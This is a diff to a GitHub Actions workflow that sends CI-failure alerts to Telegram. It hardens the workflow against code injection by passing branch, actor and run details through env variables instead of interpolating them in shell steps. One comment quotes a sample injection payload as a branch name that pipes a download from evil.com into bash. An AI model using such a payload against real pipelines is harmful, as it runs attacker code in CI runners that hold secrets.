@@ -33,14 +33,19 @@ jobs:
     steps:
       - name: Get failure details
         id: details
+        env:
+          # Security (CodeQL actions/code-injection fix): user-controlled inputs
+          # (workflow_run.name, head_branch, head_sha, actor.login) передаются через
+          # env, а не через прямую интерполяцию ${{ }} в run: блок. Это предотвращает
+          # code injection через имя branch (e.g. `"; curl evil.com | bash; #`).
+          WORKFLOW: ${{ github.event.workflow_run.name }}
+          RUN_ID: ${{ github.event.workflow_run.id }}
+          CONCL: ${{ github.event.workflow_run.conclusion }}
+          HEAD: ${{ github.event.workflow_run.head_branch }}
+          SHA: ${{ github.event.workflow_run.head_sha }}
+          ACTOR: ${{ github.event.workflow_run.actor.login }}
+          HTML_URL: ${{ github.event.workflow_run.html_url }}
         run: |
-          WORKFLOW="${{ github.event.workflow_run.name }}"
-          RUN_ID="${{ github.event.workflow_run.id }}"
-          CONCL="${{ github.event.workflow_run.conclusion }}"
-          HEAD="${{ github.event.workflow_run.head_branch }}"
-          SHA="${{ github.event.workflow_run.head_sha }}"
-          ACTOR="${{ github.event.workflow_run.actor.login }}"
-          HTML_URL="${{ github.event.workflow_run.html_url }}"
           {
             echo "WORKFLOW=${WORKFLOW}"
             echo "HEAD=${HEAD}"
@@ -55,18 +60,20 @@ jobs:
           TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
           TELEGRAM_THREAD_ID: ${{ secrets.TELEGRAM_THREAD_ID }}
+          # Security (CodeQL actions/code-injection fix): user-controlled inputs
+          # из предыдущего step передаются через env, а не через прямую
+          # интерполяцию ${{ steps.details.outputs.* }} в run: блок.
+          WORKFLOW: ${{ steps.details.outputs.WORKFLOW }}
+          HEAD: ${{ steps.details.outputs.HEAD }}
+          SHA: ${{ steps.details.outputs.SHA }}
+          ACTOR: ${{ steps.details.outputs.ACTOR }}
+          HTML_URL: ${{ steps.details.outputs.HTML_URL }}
         run: |
           # Пропускаем если TELEGRAM_BOT_TOKEN не настроен (graceful degradation).
           if [ -z "$TELEGRAM_BOT_TOKEN" ]; then
             echo "ℹ TELEGRAM_BOT_TOKEN not set — notifications disabled"
             exit 0
           fi
-
-          WORKFLOW="${{ steps.details.outputs.WORKFLOW }}"
-          HEAD="${{ steps.details.outputs.HEAD }}"
-          SHA="${{ steps.details.outputs.SHA }}"
-          ACTOR="${{ steps.details.outputs.ACTOR }}"
-          HTML_URL="${{ steps.details.outputs.HTML_URL }}"
 
           # Markdown message (< 4096 chars).
           TEXT="❌ *CI failed*\n\n*Workflow:* \`${WORKFLOW}\`\n*Branch:* \`${HEAD}\`\n*Commit:* \`${SHA}\`\n*Triggered by:* ${ACTOR}\n\n[View run](${HTML_URL})"
